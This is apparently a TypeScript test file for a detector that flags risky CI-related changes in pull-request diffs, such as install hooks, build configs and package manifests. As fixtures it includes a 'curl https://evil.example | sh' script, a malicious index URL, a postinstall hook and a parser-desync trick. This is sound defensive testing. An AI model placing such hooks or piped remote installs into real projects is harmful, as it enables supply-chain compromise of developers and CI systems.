import { describe, expect, it } from "vitest";

import { detectCiScriptHazardInDiff, detectCiScriptHazardInFiles } from "./ci-hazard.js";

describe("detectCiScriptHazardInDiff", () => {
  it("通常のアプリコード変更では誤検知しない", () => {
    const diff = [
      "diff --git a/src/sum.ts b/src/sum.ts",
      "--- a/src/sum.ts",
      "+++ b/src/sum.ts",
      "@@ -1,2 +1,3 @@",
      " export function sum(a: number, b: number) {",
      "+  // curl https://example.com はソース内のコメントなので非対象",
      "   return a + b;",
      " }",
    ].join("\n");

    expect(detectCiScriptHazardInDiff(diff)).toEqual({ detected: false, reasons: [] });
  });

  it("package.json の postinstall や packageManager 変更、JSON Unicode エスケープ回避を検知する", () => {
    const postinstallDiff = [
      "diff --git a/package.json b/package.json",
      "--- a/package.json",
      "+++ b/package.json",
      "@@ -3,2 +3,3 @@",
      '   "scripts": {',
      '+    "postinstall": "node ./scripts/evil.js"',
      "   }",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(postinstallDiff).detected).toBe(true);

    const unicodeEscapeDiff = [
      "diff --git a/packages/app/package.json b/packages/app/package.json",
      "--- a/packages/app/package.json",
      "+++ b/packages/app/package.json",
      "@@ -3,2 +3,3 @@",
      '   "scripts": {',
      '+    "test": "\\u006e\\u006f\\u0064\\u0065 -e \\"process.exit(1)\\""',
      "   }",
    ].join("\n");
    const unicodeRes = detectCiScriptHazardInDiff(unicodeEscapeDiff);
    expect(unicodeRes.detected).toBe(true);
    expect(unicodeRes.reasons[0]).toContain("packages/app/package.json");
  });

  it(".npmrc / .yarnrc.yml / Makefile / .cargo/config.toml / .gitattributes の変更を無条件検知する", () => {
    for (const file of [
      ".npmrc",
      ".yarnrc.yml",
      "sub/Makefile",
      ".cargo/config.toml",
      ".gitattributes",
      "conftest.py",
      "build.rs",
    ]) {
      const diff = [
        `diff --git a/${file} b/${file}`,
        "new file mode 100644",
        "--- /dev/null",
        `+++ b/${file}`,
        "@@ -0,0 +1,1 @@",
        "+anything",
      ].join("\n");
      expect(detectCiScriptHazardInDiff(diff).detected).toBe(true);
    }
  });

  it("他ファイル hunk 内の偽 diff --git / +++ ヘッダでパーサが脱同期されない", () => {
    // README.md に偽ヘッダを混ぜても、続く package.json の危険行を見逃さない
    const diff = [
      "diff --git a/README.md b/README.md",
      "--- a/README.md",
      "+++ b/README.md",
      "@@ -1,1 +1,4 @@",
      " # Doc",
      "+diff --git a/package.json b/package.json",
      "++++ b/safe.txt",
      "+normal line",
      "diff --git a/package.json b/package.json",
      "--- a/package.json",
      "+++ b/package.json",
      "@@ -1,2 +1,3 @@",
      '   "scripts": {',
      '+    "test": "curl https://evil.example | sh"',
      "   }",
    ].join("\n");

    const res = detectCiScriptHazardInDiff(diff);
    expect(res.detected).toBe(true);
    expect(res.reasons.some((r) => r.startsWith("package.json:"))).toBe(true);
  });

  it("package.json のバイナリ差分は fail-closed で検知する", () => {
    const diff = [
      "diff --git a/package.json b/package.json",
      "Binary files a/package.json and b/package.json differ",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(diff).detected).toBe(true);
  });

  it("引用符付きパスや拡張ツールチェーン設定・各言語マニフェスト実行フックを漏れなく検知する", () => {
    // 1. スペースを含む引用符付き diff --git ヘッダ
    const quotedDiff = [
      'diff --git "a/my pkg/package.json" "b/my pkg/package.json"',
      '--- "a/my pkg/package.json"',
      '+++ "b/my pkg/package.json"',
      "@@ -1,2 +1,3 @@",
      '   "scripts": {',
      '+    "pretest": "echo pwn"',
      "   }",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(quotedDiff).detected).toBe(true);

    // 2. 追加された無条件ハザードファイル（テストランナー設定・ワークスペース・venv）
    for (const file of [
      "vitest.config.mts",
      "vitest.workspace.ts",
      "jest.config.cjs",
      "pnpm-workspace.yaml",
      ".pnpmfile.mjs",
      "setup.cfg",
      "sitecustomize.py",
      ".venv/bin/pytest",
    ]) {
      const diff = [
        `diff --git a/${file} b/${file}`,
        "new file mode 100644",
        "--- /dev/null",
        `+++ b/${file}`,
        "@@ -0,0 +1,1 @@",
        "+content",
      ].join("\n");
      expect(detectCiScriptHazardInDiff(diff).detected, file).toBe(true);
    }

    // 3. package.json の直接実行スクリプトおよび file: 依存 URL
    const scriptExecDiff = [
      "diff --git a/package.json b/package.json",
      "--- a/package.json",
      "+++ b/package.json",
      "@@ -1,2 +1,3 @@",
      '   "scripts": {',
      '+    "test": "node ./scripts/pwn.js"',
      "   }",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(scriptExecDiff).detected).toBe(true);

    const fileDepDiff = [
      "diff --git a/package.json b/package.json",
      "--- a/package.json",
      "+++ b/package.json",
      "@@ -1,2 +1,3 @@",
      '   "dependencies": {',
      '+    "evil": "file:./vendor/evil"',
      "   }",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(fileDepDiff).detected).toBe(true);

    // 4. pyproject.toml の build-backend / index-url / addopts と Cargo.toml の proc_macro = true
    const pyprojectDiff = [
      "diff --git a/pyproject.toml b/pyproject.toml",
      "--- a/pyproject.toml",
      "+++ b/pyproject.toml",
      "@@ -1,1 +1,3 @@",
      " [tool.pytest.ini_options]",
      '+addopts = "-p evil_plugin"',
      '+index-url = "https://evil.example/simple"',
    ].join("\n");
    expect(detectCiScriptHazardInDiff(pyprojectDiff).detected).toBe(true);

    const cargoDiff = [
      "diff --git a/Cargo.toml b/Cargo.toml",
      "--- a/Cargo.toml",
      "+++ b/Cargo.toml",
      "@@ -1,1 +1,2 @@",
      " [lib]",
      "+proc_macro = true",
    ].join("\n");
    expect(detectCiScriptHazardInDiff(cargoDiff).detected).toBe(true);
  });
});

describe("detectCiScriptHazardInFiles", () => {
  it("一覧が truncated または対象マニフェストの patch 欠損時は fail-closed で検知する", () => {
    expect(detectCiScriptHazardInFiles([], true).detected).toBe(true);
    expect(
      detectCiScriptHazardInFiles(
        [
          {
            filename: "package.json",
            status: "modified",
            additions: 10,
            deletions: 0,
            changes: 10,
          },
        ],
        false,
      ).detected,
    ).toBe(true);
    expect(
      detectCiScriptHazardInFiles(
        [
          {
            filename: "src/index.ts",
            status: "modified",
            additions: 1,
            deletions: 0,
            changes: 1,
            patch: "+export const a = 1;",
          },
        ],
        false,
      ).detected,
    ).toBe(false);
  });
});
